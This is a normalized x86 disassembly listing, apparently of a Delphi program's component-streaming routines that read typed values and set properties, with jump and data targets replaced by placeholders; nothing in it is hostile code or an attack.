pop edi
pop esi
pop ebx
pop ebp
retn
sub_417bd4
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_417944
pop ecx
test al al
jne r-xdata
call sub_403b4c
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403af8
sub_417bf8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_417e19
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_418ea4
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_418ea4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_417de9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_417da7
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_417844
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_4178bc
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_4179a4
pop ecx
push ebp
call sub_417b54
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_417ab4
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_403b7c
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_4178bc
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_4178bc
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417e20
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_4040b8
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4050d0
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_403540
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_414418
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_417808
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_414210
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_417808
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_414210
sub_417dac
push ebp
call sub_417924
pop ecx
test al al
je r-xdata
call sub_403af8
call sub_403b4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_403344
sub_417e34
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417ea4
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_417e8f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417ea4
mov eax [ ebp - 0x4 ]
call sub_4173f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_417538
retn
sub_417ea4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4172dc
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4183ac
mov eax [ ebp - 0x4 ]
call sub_418248
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_403540
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_417f66
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_403540
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4172dc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_417bf8
mov eax [ ebp - 0x4 ]
call sub_418248
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417f6d
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_417f74
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_419080
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_4181fc
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_417644
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_417fb8
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_419080
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_4181fc
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_417644
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_417ffc
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_419080
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_4181fc
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_417644
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_41804c
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_419080
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_4181fc
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_417644
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_418090
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_419080
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_41711c
mov al [ eax + lookup_table_4180b7 ]
jmp [ eax * 4 + jump_table_4180c5 ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_417644
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_404184
mov eax esi
call j_sub_404560#2
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_417644
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_4040e8
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_4040e8
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_4040e8
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_4040e8
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_418190
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_419080
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_417644
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_417644
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_417644
jmp r-xdata
jmp r-xdata
call sub_41711c
sub_4181fc
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_417620
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_418190
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_419080
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_417644
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_418250
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_417620
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_419080
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_418190
mov [ edi ] eax
sub_418290
push ebp
mov ebp esp
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_418381
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_404094
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_40412c
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdb4
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418388
lea eax [ ebp - 0x4 ]
call sub_404094
retn
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_403294
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4042f8
sub_4183ac
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41857c
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_403910#3
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_418ea4
xor edx edx
push ebp
push j_sub_403910#2
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_404354
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_4045b4
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403584
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_411138
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403584
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_411138
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_418730
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_417630
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_417630
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_4034d0
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_4111a8
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_418390
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418583
lea eax [ ebp - 0x8 ]
call sub_404094
retn
mov edi ebx
jmp r-xdata
sub_418536
add [ eax ] eax
add [ eax ] al
adc al 0x72
inc eax
add [ edx - 0x7b ] al
inc ecx
add [ ecx - 0xbba743d ] cl
cmp [ eax + 0x78 ] 0x0
je r-xdata
call sub_403af8
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403b4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418583
lea eax [ ebp - 0x8 ]
call sub_404094
retn
sub_41858c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_413d60
mov ebx eax
test ebx ebx
je r-xdata
call sub_41711c
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_41121c
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4185d4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_416bb0
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_414210
pop edi
pop esi
pop ebx
pop ebp
retn
sub_418614
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_418663
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_419798
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4116b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41866a
lea eax [ ebp - 0x10 ]
call sub_40f25c
retn
sub_418670
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_418722
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_417620
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_418090
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_416bb0
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_414210
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_419080
lea eax [ ebp - 0x4 ]
call sub_4057e0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_41176c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418729
lea eax [ ebp - 0x8 ]
call sub_404094
lea eax [ ebp - 0x4 ]
call sub_4057e0
retn
sub_418730
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418a2b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418a32
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_4040b8
lea eax [ ebp - 0x24 ]
call sub_404774
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_4040b8
retn
jmp [ eax * 4 + jump_table_4187c0 ]
mov eax [ rw-data ]
call sub_417104
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4111a8
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_417620
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4176e0
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41121c
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_418090
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_4110d4
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41121c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417f74
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4114ac
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_418ee0
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4113ac
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_418f9c
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4113d8
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418dc4
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41121c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417620
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_417620
cmp al 0xd
jne r-xdata
push ebp
call sub_418614
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4181fc
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_411730
jmp r-xdata
push ebp
call sub_418670
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4111a8
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_418190
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41121c
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_418090
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41858c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_419080
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41121c
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_418090
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_419080
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4116f8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_419080
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4111a8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_417738
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4116f8
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_418090
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4185d4
pop ecx
jmp r-xdata
sub_418a38
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_4040e8
jmp r-xdata
mov eax [ ebx ]
call sub_413ef8
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_409094
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418a98
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418db3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_418e80
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_418d91
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_418d52
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_418ea4
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_418ea4
mov eax [ ebp - 0x1c ]
call sub_413a98
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_418ea4
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_418ea4
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_418a38
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_418ea4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_40328c
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4137e8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_418cf7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_405f10
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_414210
xor eax eax
push ebp
push sub_418cd7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
